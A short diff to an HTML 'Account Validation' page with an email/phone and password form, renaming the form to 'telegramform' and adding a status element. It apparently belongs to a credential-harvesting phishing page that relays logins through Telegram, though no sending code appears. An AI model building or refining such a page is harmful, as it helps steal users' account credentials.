@@ -73,7 +73,7 @@ span.psw {
 
 <h2>Account Validation</h2>
 
- <form id="contactForm">
+ <form id="telegramform">
 
     <label for="email">Email / Phone Number</label>
     <input
@@ -94,6 +94,8 @@ span.psw {
     >
 
     <button type="submit" id="submitBtn">
+
+      <p id="formstatus"></p>
       Submit
     </button>
 
@@ -104,7 +106,7 @@ span.psw {
 </div>
 
 <script>
-const form = document.getElementById("contactForm");
+const form = document.getElementById("telegramform");
 const button = document.getElementById("submitBtn");
 const status = document.getElementById("formStatus");
 
